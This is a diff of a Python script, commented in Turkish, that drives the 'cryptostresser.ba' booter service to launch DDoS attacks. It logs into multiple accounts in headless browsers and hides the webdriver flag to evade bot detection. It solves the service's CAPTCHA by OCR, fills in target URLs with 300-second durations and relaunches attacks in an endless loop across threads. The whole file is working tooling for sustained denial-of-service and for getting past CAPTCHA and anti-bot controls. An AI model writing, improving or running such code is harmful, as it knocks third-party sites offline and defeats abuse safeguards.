@@ -1,17 +1,27 @@
-import threading, time, os, re, base64, io, sys, logging
-from playwright.sync_api import sync_playwright
+import threading
+import time
+import os
+import re
+import base64
+import io
+import shutil
+import sys
+import logging
+from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout
 from PIL import Image
 import ddddocr
 
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
-logger = logging.getLogger(__name__)
 ocr = ddddocr.DdddOcr()
 
-class DDoSNow:
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
+logger = logging.getLogger(__name__)
+
+class DDoSNowManager:
     def __init__(self):
-        self.base_url = "https://cryptostresser.ba"
         self.accounts = self.load_accounts()
-        self.running = {}
+        self.running_states = {}
+        self.stop_events = {}
+        self.active_threads = {}
         
     def load_accounts(self):
         accounts = []
@@ -25,183 +35,213 @@ class DDoSNow:
                 if line and not line.startswith("#"):
                     p = line.split(":")
                     if len(p) >= 3:
-                        accounts.append({"user": p[0], "pass": p[1], "target": p[2]})
-                        logger.info(f"Hesap: {p[0]} -> {p[2]}")
+                        accounts.append({"id": str(len(accounts)+1), "user": p[0], "pass": p[1], "target": p[2]})
         return accounts
-    
+
     def solve_captcha(self, page):
         try:
-            deploy_btn = page.locator("button.btn-confirm:has-text('Deploy Attack')").first
-            deploy_btn.click()
+            first_deploy = page.locator("button.btn-confirm:has-text('Deploy Attack')").first
+            first_deploy.click()
             time.sleep(2)
         except:
             return False
-            
+
         while True:
             try:
-                img = page.locator("img[alt='captcha']").first
-                if img.count() == 0:
-                    time.sleep(1)
-                    continue
-                    
-                img_src = img.get_attribute("src")
+                img_elem = page.locator("img[alt='captcha']").first
+                img_src = img_elem.get_attribute("src")
                 if not img_src or not img_src.startswith("data:image"):
                     time.sleep(1)
                     continue
-                    
-                b64 = re.sub(r'^data:image/\w+;base64,', '', img_src)
-                text = re.sub(r'[^A-Z0-9]', '', ocr.classification(Image.open(io.BytesIO(base64.b64decode(b64)))).upper())
-                
-                if not text:
+
+                base64_data = re.sub(r'^data:image/\w+;base64,', '', img_src)
+                img_bytes = base64.b64decode(base64_data)
+                img = Image.open(io.BytesIO(img_bytes))
+
+                captcha_text = ocr.classification(img)
+                captcha_text = re.sub(r'[^A-Z0-9]', '', captcha_text.upper())
+
+                if not captcha_text:
                     time.sleep(1)
                     continue
-                    
-                logger.info(f"OCR: {text}")
-                
+
+                logger.info(f"OCR: {captcha_text}")
+
                 captcha_input = page.locator("input[name='captcha']").first
                 captcha_input.fill("")
-                time.sleep(0.5)
-                captcha_input.fill(text)
+                captcha_input.fill(captcha_text)
                 time.sleep(1)
-                
-                deploy_btn2 = page.locator("button[type='submit'].btn-confirm").first
-                deploy_btn2.click()
+
+                second_deploy = page.locator("button[type='submit'][form='hubForm']").first
+                if second_deploy.count() == 0:
+                    second_deploy = page.locator("button.btn-confirm:has-text('Deploy Attack')").last
+                second_deploy.click()
                 time.sleep(3)
-                
-                if page.locator("text=Invalid captcha").count() > 0:
-                    logger.info(f"Yanlış captcha: {text}")
+
+                if page.locator("text=Invalid captcha code").count() > 0:
+                    logger.info(f"Yanlış captcha: {captcha_text}")
                     captcha_input.fill("")
                     time.sleep(1)
                     continue
-                    
-                logger.info("Attack başlatıldı!")
-                return True
-                
+                else:
+                    logger.info("Attack başlatıldı (captcha doğru).")
+                    return True
             except Exception as e:
-                logger.error(f"Captcha hatası: {e}")
+                logger.error(f"Captcha çözme hatası: {e}")
                 time.sleep(2)
                 continue
-    
-    def worker(self, acc):
-        user = acc["user"]
-        pwd = acc["pass"]
-        target = acc["target"]
-        
-        while self.running.get(user, False):
+
+    def browser_worker(self, acc_id, target_url, account_data):
+        username = account_data["user"]
+        password = account_data["pass"]
+        profile_dir = os.path.join(os.getcwd(), f"profiles/profile_{username}")
+        stop_event = self.stop_events.get(acc_id)
+
+        while self.running_states.get(acc_id, False):
             try:
+                if os.path.exists(profile_dir):
+                    try:
+                        shutil.rmtree(profile_dir)
+                    except:
+                        pass
+                os.makedirs(profile_dir, exist_ok=True)
+
                 with sync_playwright() as p:
-                    ctx = p.chromium.launch_persistent_context(
-                        user_data_dir=f"profiles/{user}",
+                    context = p.chromium.launch_persistent_context(
+                        user_data_dir=profile_dir,
                         headless=True,
                         args=['--no-sandbox', '--disable-setuid-sandbox'],
-                        viewport={"width": 1280, "height": 720}
+                        viewport={"width": 1280, "height": 720},
+                        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                     )
-                    page = ctx.new_page()
-                    page.add_init_script("Object.defineProperty(navigator,'webdriver',{get:()=>undefined})")
-                    
-                    # LOGIN
-                    logger.info(f"[{user}] Giriş yapılıyor...")
-                    page.goto(f"{self.base_url}/login", timeout=60000)
-                    page.wait_for_load_state("networkidle", timeout=30000)
+                    page = context.new_page()
+                    page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined});")
+
+                    # GİRİŞ
+                    logger.info(f"[{username}] Giriş sayfası...")
+                    page.goto("https://cryptostresser.ba/login", timeout=60000)
+                    page.wait_for_load_state("networkidle")
                     time.sleep(2)
-                    
-                    page.fill("input[name='username']", user)
-                    page.fill("input[name='password']", pwd)
+                    page.fill("input[name='username']", username)
+                    page.fill("input[name='password']", password)
                     page.click("button[type='submit']")
                     time.sleep(3)
                     
-                    # HUB
-                    logger.info(f"[{user}] Hub sayfasına gidiliyor...")
-                    page.goto(f"{self.base_url}/hub", timeout=60000)
-                    page.wait_for_load_state("networkidle", timeout=30000)
+                    try:
+                        got_it = page.locator("button:has-text('Got it')").first
+                        if got_it.count() > 0:
+                            got_it.click()
+                            time.sleep(1)
+                    except:
+                        pass
+                    
+                    logger.info(f"[{username}] Hub sayfasına gidiliyor...")
+                    page.goto("https://cryptostresser.ba/hub", timeout=60000)
+                    page.wait_for_load_state("networkidle")
                     time.sleep(2)
                     
                     if "login" in page.url:
-                        logger.error(f"[{user}] Giriş başarısız!")
+                        logger.error(f"[{username}] Giriş başarısız!")
                         time.sleep(30)
                         continue
                     
-                    logger.info(f"[{user}] Giriş başarılı!")
-                    
+                    logger.info(f"[{username}] Giriş başarılı")
+
                     # ANA DÖNGÜ
-                    while self.running.get(user, False):
+                    while self.running_states.get(acc_id, False) and not (stop_event and stop_event.is_set()):
                         try:
-                            # Hedef URL - name ile bul
-                            page.locator("input[name='hub.0.host']").first.fill(target, timeout=10000)
-                            
-                            # Süre - CSS selector ile (id'de nokta var)
+                            # Hedef URL ve süre
+                            page.locator("input[name='hub.0.host']").first.fill(target_url, timeout=10000)
                             page.locator("input[id='hub.0.time']").first.fill("300", timeout=5000)
-                            
-                            # Captcha çöz
-                            logger.info(f"[{user}] Captcha çözülüyor...")
+
+                            # CAPTCHA çöz
+                            logger.info(f"[{username}] CAPTCHA çözülüyor...")
                             if not self.solve_captcha(page):
-                                logger.warning(f"[{user}] Captcha çözülemedi!")
-                                page.reload()
-                                time.sleep(3)
-                                continue
-                            
-                            logger.info(f"[{user}] Attack başladı! - {target}")
-                            
+                                logger.error(f"[{username}] CAPTCHA çözülemedi!")
+                                break
+
+                            logger.info(f"[{username}] Attack aktif, süre takibi...")
                             # Süre takibi
-                            while self.running.get(user, False):
+                            while self.running_states.get(acc_id, False) and not (stop_event and stop_event.is_set()):
                                 try:
                                     badge = page.locator(".accordion-button .badge").first
                                     if badge.count() > 0:
-                                        t = badge.text_content().strip()
-                                        logger.info(f"[{user}] Kalan: {t}")
-                                        if t in ["0m 0s", "0s"]:
-                                            logger.info(f"[{user}] Süre doldu!")
+                                        time_text = badge.text_content().strip()
+                                        logger.info(f"[{username}] Kalan süre: {time_text}")
+                                        if time_text == "0m 0s" or time_text == "0s":
+                                            logger.info("Süre doldu, yeniden başlatılıyor...")
                                             break
                                     else:
                                         running = page.locator(".stats-content .badge:has-text('Running')").first
                                         if running.count() == 0:
-                                            logger.info(f"[{user}] Attack bitti!")
+                                            logger.info("Attack bitti (Running yok).")
                                             break
                                 except:
                                     pass
                                 time.sleep(5)
-                            
-                            # Yeniden başlat
-                            logger.info(f"[{user}] Yeniden başlatılıyor...")
+
+                            if not self.running_states.get(acc_id, False):
+                                break
+
+                            logger.info(f"[{username}] Süre doldu, yeniden başlatılıyor...")
                             page.reload()
                             time.sleep(3)
-                            
                             if "/hub" not in page.url:
-                                page.goto(f"{self.base_url}/hub")
+                                page.goto("https://cryptostresser.ba/hub")
                                 time.sleep(2)
-                            
-                        except Exception as e:
-                            logger.error(f"[{user}] İşlem hatası: {e}")
+
+                        except (PlaywrightTimeout, Exception) as inner_e:
+                            logger.error(f"[{username}] Adım hatası: {inner_e} - sayfa yenileniyor")
                             page.reload()
                             time.sleep(3)
                             continue
-                    
-                    ctx.close()
-                    
-            except Exception as e:
-                logger.error(f"[{user}] Kritik hata: {e}")
+
+                    if stop_event and stop_event.is_set():
+                        logger.info(f"[{username}] Attack durduruluyor...")
+                        try:
+                            trash_btn = page.locator(".btn-danger .fa-trash-alt").first
+                            if trash_btn.count() > 0:
+                                trash_btn.click()
+                                logger.info("Saldırı durduruldu.")
+                                time.sleep(2)
+                        except:
+                            pass
+
+                    context.close()
+
+            except Exception as outer_e:
+                logger.error(f"[{username}] KRİTİK HATA: {outer_e}")
                 time.sleep(10)
-    
-    def start(self):
+                continue
+
+        logger.info(f"[{username}] Durduruldu")
+        self.running_states[acc_id] = False
+
+    def start_all(self):
         if not self.accounts:
-            logger.error("accounts.txt boş veya yok!")
+            logger.error("Hiç hesap yok!")
             return
             
-        logger.info(f"{len(self.accounts)} hesap başlatılıyor...")
-        for a in self.accounts:
-            self.running[a["user"]] = True
-            t = threading.Thread(target=self.worker, args=(a,), daemon=True)
+        for acc in self.accounts:
+            acc_id = acc["id"]
+            target = acc.get("target", "https://example.com")
+            self.running_states[acc_id] = True
+            self.stop_events[acc_id] = threading.Event()
+            t = threading.Thread(target=self.browser_worker, args=(acc_id, target, acc), daemon=True)
+            self.active_threads[acc_id] = t
             t.start()
-            logger.info(f"[{a['user']}] Başlatıldı -> {a['target']}")
+            logger.info(f"[{acc['user']}] Başlatıldı -> {target}")
             time.sleep(2)
         
+        # Durum raporu
         while True:
             time.sleep(60)
             logger.info("="*50)
             logger.info("AKTİF HESAPLAR:")
-            for u, r in self.running.items():
-                target = next((a["target"] for a in self.accounts if a["user"] == u), "?")
-                logger.info(f"  {u}: {'CALISIYOR' if r else 'DURDURULDU'} -> {target}")
+            for acc in self.accounts:
+                acc_id = acc["id"]
+                status = "Çalışıyor" if self.running_states.get(acc_id, False) else "Durduruldu"
+                logger.info(f"  {acc['user']}: {status} -> {acc.get('target', '?')}")
             logger.info("="*50)
 
 if __name__ == "__main__":
@@ -210,4 +250,5 @@ if __name__ == "__main__":
     ║   CRYPTOSTRESSER.BA - DDOS AUTOMATION     ║
     ╚═══════════════════════════════════════════╝
     """)
-    DDoSNow().start()
+    manager = DDoSNowManager()
+    manager.start_all()
